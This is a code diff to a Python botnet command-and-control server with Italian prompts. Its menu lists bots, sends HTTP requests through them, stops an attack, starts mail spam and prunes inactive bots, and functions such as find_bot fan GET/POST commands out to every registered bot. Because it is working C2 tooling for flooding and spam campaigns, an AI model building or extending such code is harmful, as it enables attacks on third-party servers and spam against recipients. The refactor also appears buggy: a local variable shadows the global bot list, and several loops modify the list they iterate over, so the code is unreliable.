@@ -8,15 +8,15 @@ import requests
 
 # server_address = ('10.0.2.15', 15200)
 server_address = ('localhost', 15200)
-clients = []
+bots = []
 
 
 def write_on_json_file():
     with open("bot-db.json", "w") as f:
-        if len(clients) == 0:
+        if len(bots) == 0:
             f.write("")
             return
-        json.dump(clients, f)
+        json.dump(bots, f)
 
 
 def initialize_bot_list():
@@ -25,7 +25,7 @@ def initialize_bot_list():
             bots = json.loads(data)
             for bot in bots:
                 if check_bot_is_active(bot):
-                    clients.append((bot[0], bot[1]))
+                    bots.append((bot[0], bot[1]))
     write_on_json_file()
 
 
@@ -50,8 +50,8 @@ def initialize(e):
             bot = (address[0], data['port'])
             print(f"Bot {bot} connesso")
 
-            if bot not in clients:
-                clients.append(bot)
+            if bot not in bots:
+                bots.append(bot)
                 write_on_json_file()
 
         except socket.timeout:
@@ -79,10 +79,10 @@ def handle_console(e):
     Handle console input from the user.
     """
     while not e.is_set():
-        print("1. Mostra tutti i client connessi")
+        print("1. Mostra tutti i bot connessi")
         print("2. Effettua richieste http")
         print("3. Ferma attacco")
-        print("4. Mostra informazioni di un client")
+        print("4. Mostra informazioni di un bot")
         print("5. Avvia mail spam")
         print("6. Controlla lo stato dei bot")
         print("7. Rimuovi tutti i bot inattivi")
@@ -116,17 +116,17 @@ def get_all_clients():
     """
     Print all the clients connected to the server
     """
-    if len(clients) == 0:
+    if len(bots) == 0:
         print("--------------------------------------")
         print("Nessun bot connesso")
         print("--------------------------------------")
         return
 
     print("--------------------------------------")
-    print("Numero di bot connessi: ", len(clients))
+    print("Numero di bot connessi: ", len(bots))
     print("--------------------------------------")
-    for key, client in enumerate(clients):
-        print(f'Bot {key + 1}: {client}')
+    for key, bot in enumerate(bots):
+        print(f'Bot {key + 1}: {bot}')
         print("--------------------------------------")
 
 
@@ -187,22 +187,22 @@ def mail_spam():
 
 
 def find_bot(path, method, j=None):
-    if len(clients) == 0:
+    if len(bots) == 0:
         print("Nessun bot connesso")
         return
 
     if input("Voi utilizzare tutti i bot connessi? S/n: ") in ["S", "s", ""]:
         if method == "GET":
-            for client in clients:
-                res = requests.get(f"http://{client[0]}:{client[1]}/{path}")
+            for bot in bots:
+                res = requests.get(f"http://{bot[0]}:{bot[1]}/{path}")
                 if path == "client-info":
-                    print_client_info(client, res)
+                    print_client_info(bot, res)
         elif method == "POST":
-            for client in clients:
-                requests.post(f"http://{client[0]}:{client[1]}/{path}", json=j)
+            for bot in bots:
+                requests.post(f"http://{bot[0]}:{bot[1]}/{path}", json=j)
     else:
-        client_ip = input("Inserisci l'Ip del bot: ")
-        c = next((client for client in clients if client[0] == client_ip), None)
+        bot_ip = input("Inserisci l'Ip del bot: ")
+        c = next((bot for bot in bots if bot[0] == bot_ip), None)
         if c is None:
             print("Bot non trovato")
             return
@@ -219,29 +219,32 @@ def bot_status():
     """
     Check if a bot is still connected to the server.
     """
-    for client in clients:
+    for bot in bots:
         try:
-            res = requests.get(f"http://{client[0]}:{client[1]}/status")
+            res = requests.get(f"http://{bot[0]}:{bot[1]}/status")
 
-            print(f"Bot: {client}")
-            print(f"Operation: {res.json()['operation']}")
-            if targets := res.json()['targets']:
-                for targets in targets:
+            if not res.json():
+                print(f"Bot {bot} in attesa di comandi")
+                continue
+            print(f"Bot: {bot}")
+            for op in res.json():
+                print(f"Operation: {op['operation']}")
+                for targets in op['targets']:
                     print(f"Target: {targets}")
             print("--------------------------------")
         except requests.exceptions.ConnectionError:
-            print(f"Bot {client} disconnesso")
-            clients.remove(client)
+            print(f"Bot {bot} disconnesso")
+            bots.remove(bot)
 
 
 def rimuovi_bot_inattivi():
     """
     Remove all the inactive bots
     """
-    for client in clients:
-        if not check_bot_is_active(client):
-            print(f"Bot {client} disconnesso")
-            clients.remove(client)
+    for bot in bots:
+        if not check_bot_is_active(bot):
+            print(f"Bot {bot} disconnesso")
+            bots.remove(bot)
     write_on_json_file()
 
 def check_bot_is_active(bot):
